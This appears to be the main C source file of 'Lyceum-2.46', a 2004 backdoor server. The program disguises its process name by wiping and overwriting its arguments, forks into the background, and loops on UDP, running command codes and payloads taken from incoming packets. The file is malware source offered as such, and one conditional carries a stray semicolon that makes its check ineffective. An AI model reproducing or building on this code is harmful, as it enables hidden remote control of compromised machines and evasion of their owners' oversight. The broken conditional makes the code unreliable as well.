/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/select.h>
#include "lyceum_proto.h"
#include "lyceum_host.h"
#include "lyceum_comcode.h"

#ifndef _NO_ENCRYPTION_
#include "key.h"
#endif

int
main (int argc, char *argv[])
{

  // main server source
  
  char *read_buf = NULL;
  packet.com_code = -1;
  char *hide;

  hide = edu_proc_mask (argc, argv);

  // Hide process name
  
  if (hide != NULL)
    {
      while (argc--)
	bzero (argv[argc], strlen (argv[argc]));
      strncpy (argv[0], hide, 1024);
    }

  if ((fork ()) != 0)
    exit (0);

  signal (SIGCHLD, SIG_IGN);

  if ((read_buf = malloc (sizeof (char) * BUFSIZ)) == NULL)
    {
      perror ("malloc()");
      exit (EXIT_FAILURE);
    }

  while (packet.com_code != LYM_EXIT)
    {
      // read packet
      read_buf = udp_listen (0);
      // parse and check if its a lyceum packet
      parse_lyceum_pkt (read_buf);

      if (packet.com_code > -1);
      {
        // take the desired action
	execute_comcode (packet.com_code, packet.payload);
	bzero (read_buf, strlen (read_buf));
      }
    }
  return 0;
}
